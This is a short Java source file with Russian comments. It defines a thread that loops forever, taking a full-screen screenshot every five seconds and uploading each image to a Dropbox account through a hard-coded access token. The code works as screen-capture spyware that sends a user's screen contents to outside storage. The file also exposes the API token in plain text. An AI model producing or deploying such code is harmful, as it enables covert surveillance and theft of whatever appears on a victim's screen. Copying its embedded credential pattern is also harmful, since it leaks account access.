import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class DropThread extends  Thread{
    @Override
    public void run() {
        String ACESS_TOKEN = "5Q1ETkV0yWAAAAAAAAAAJ84arFF99N9MTYL2rcrlhghSFhGtuahn7wicJIR7bFF_";
        //Вечный цикл с интервалом 5 секунд
        for(;;) { //Мне 13 лет)
            try {
                //Скрин экрана
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                //Преобразование image в InputStream
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                ImageIO.write(image, "png", outputStream);
                byte[] i = outputStream.toByteArray();
                InputStream inputStream = new ByteArrayInputStream(outputStream.toByteArray());
                //Создание клиента DropBox
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                DbxClientV2 client = new DbxClientV2(config, ACESS_TOKEN);
                //Имя файла
                String fileName = "/" + new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date()) + ".png";
                //Отправка в DropBox
                client.files().uploadBuilder(fileName).uploadAndFinish(inputStream);

                System.out.println("Успешно!");
                sleep(5000);
            } catch (AWTException | InterruptedException | DbxException | IOException e) {
                e.printStackTrace();
            }
        }
    }
}
